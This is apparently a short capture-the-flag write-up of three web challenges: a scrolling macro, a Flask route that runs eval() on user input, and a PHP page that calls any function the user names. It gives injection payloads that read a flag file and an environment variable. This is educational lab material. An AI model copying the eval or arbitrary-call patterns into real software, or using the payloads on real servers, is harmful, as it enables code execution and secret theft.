## Space War Web 2024 May WriteUp 
# **Scroll_Master**
Just scroll until gage is full.   

```python
import time
from pynput import keyboard
from pynput.keyboard import Key
from pynput.mouse import Controller

mouse = Controller()

def key_check(key):
	global continueLooping
	try:
		if key.char == 'y':
			continueLooping = True
		if key.char != 'y' and key != keyboard.Key.esc:
			mouse.scroll(dx=0, dy=0)
	except AttributeError:
		print('Check')

def on_release(key):
	global continueLooping

	if key == Key.esc:
		continueLooping = False
		mouse.scroll(dx=0, dy=0)

def scroll_wheel():
	mouse.scroll(dx=0, dy=-10000000000)
continueLooping = False

listener = keyboard.Listener(
    on_press=key_check,
    on_release=on_release)
listener.start()

while True:
	time.sleep(1)
	while continueLooping:
		scroll_wheel()
```
As I couldn't find how to make click event in js, I used python macro...    
   
`hspace{wOw_ScrO1l_m4ST3r}`

# **jelly shop**
```python
@app.route('/order', methods=['POST'])
def order():
  json = request.get_json()
  result = eval(json['total'])
  if not result: return '주문과정 중 에러가 발생했습니다.'
  elif isinstance(result,int): return '주문이 완료되었습니다.'
  return result
```
It has eval() function.   
Send request to `/?total=open("./app/plag/flag.txt","r").read()`   

`hspace{hello_i_am_flag}`

# **Exec Anything**
```php
if (isset($_GET['function_name'])) {
    $func = $_GET['function_name'];
    $args = $_GET['args'] ?? '';

    $args = explode(',', $args);
    array_walk($args, function(&$item) { $item = trim($item); });
    
    $output = call_user_func_safely($func, $args);
    echo '<pre>' . print_r($output, true) . '</pre>';
} else {
    echo '<form method="get">
            Function Name: <input type="text" name="function_name" placeholder="Enter function name">
            <br>
            Arguments: <input type="text" name="args" placeholder="Comma-separated arguments">
            <br>
            <input type="submit" value="Execute">
          </form>';
}
```
If press button, you can execute specific function with arguments.    
```docker
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    SetEnv flag "hspace{?}"

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```
Docker file has environment value with `SetEnv`.   
I executed `getenv` with `flag` argument.   

`hspace{7d3132494e5ba4a0cea74ecc8a3495caalea7299c238896d4d1491bbfa4fb796}`